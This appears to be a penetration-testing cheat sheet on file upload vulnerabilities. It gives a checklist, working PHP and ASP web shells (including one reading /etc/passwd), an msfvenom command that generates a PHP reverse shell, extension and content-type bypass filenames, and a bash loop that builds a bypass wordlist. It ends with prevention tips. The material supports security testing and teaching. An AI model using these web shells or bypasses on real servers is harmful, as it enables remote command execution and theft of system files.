# File Upload

File upload vulnerabilities occur when a web application allows users to upload files without adequate validation, enabling attackers to upload malicious files (web shells, scripts, etc.).

## Checks

- [ ] What is the server running? PHP, .NET, etc.?
- [ ] Check unrestricted file upload
- [ ] Are file restrictions enforced on the server or only on the client-side?
  - Check for client-side bypass
  - Check for black/whitelist filters
  - Check for type-filter bypass
  - Check for content-type bypass
  - Try magic bytes/file signature bypass
    - Allowed MIME type with disallowed content-type
    - Allowed MIME/content-type with disallowed extension
    - Disallowed MIME/content-type with allowed extension
- [ ] Check partial uploads — [XSS](xss.md), [XXE](xxe.md)
  - Can we change content type to text/html
  - Check for docx uploads
  - Check SVG uploads
- [ ] Check for path traversal in the filename
- [ ] Check for injections in filename
  - [Command injection](command-injection.md)
  - [XSS](xss.md)
  - [SQL injection](sql-injection.md)
- [ ] Check if the upload directory is disclosed
- [ ] Try character injections before and after extension

## Web Shells

| **Web Shell**                                                                           | **Description**                       |
| --------------------------------------------------------------------------------------- | ------------------------------------- |
| `<?php echo file_get_contents('/etc/passwd'); ?>`                                       | Basic PHP File Read                   |
| `<?php system('hostname'); ?>`                                                          | Basic PHP Command Execution           |
| `<?php system($_REQUEST['cmd']); ?>`                                                    | Basic PHP Web Shell                   |
| `<% eval request('cmd') %>`                                                             | Basic ASP Web Shell                   |
| `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`          | Generate PHP reverse shell            |
| [PHP Web Shell](https://github.com/Arrexel/phpbash)                                     | PHP Web Shell                         |
| [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)                 | PHP Reverse Shell                     |
| [Web/Reverse Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) | List of Web Shells and Reverse Shells |

## Bypasses

| **Command**                                                                                                                                | **Description**                              |
| ------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------- |
| **Client-Side Bypass**                                                                                                                     |                                              |
| `[CTRL+SHIFT+C]`                                                                                                                           | Toggle Page Inspector                        |
| **Blacklist Bypass**                                                                                                                       |                                              |
| `shell.phtml`                                                                                                                              | Uncommon Extension                           |
| `shell.pHp`                                                                                                                                | Case Manipulation                            |
| [PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) | List of PHP Extensions                       |
| [ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)                | List of ASP Extensions                       |
| [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)                          | List of Web Extensions                       |
| **Whitelist Bypass**                                                                                                                       |                                              |
| `shell.jpg.php`                                                                                                                            | Double Extension                             |
| `shell.php.jpg`                                                                                                                            | Reverse Double Extension                     |
| `%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, `…`                                                                                          | Character Injection - Before/After Extension |
| **Content/Type Bypass**                                                                                                                    |                                              |
| [Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)                    | List of All Content-Types                    |
| [File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)                                                                   | List of File Signatures/Magic Bytes          |

### Create extensions wordlist

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

## Limited Uploads

| **Potential Attack** | **File Types**          |
| -------------------- | ----------------------- |
| `XSS`                | HTML, JS, SVG, GIF      |
| `XXE`/`SSRF`         | XML, SVG, PDF, PPT, DOC |
| `DoS`                | ZIP, JPG, PNG           |

## Prevention

- [ ] Extension validation
- [ ] Content validation
- [ ] Limit file size
- [ ] Update libraries in use
- [ ] Scan uploaded files for malicious strings/content
- [ ] Use a WAF

---

## References

- [PayloadsAllTheThings - Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
- [HackTricks - File Upload](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html)
- [PortSwigger - File Upload](https://portswigger.net/web-security/file-upload)
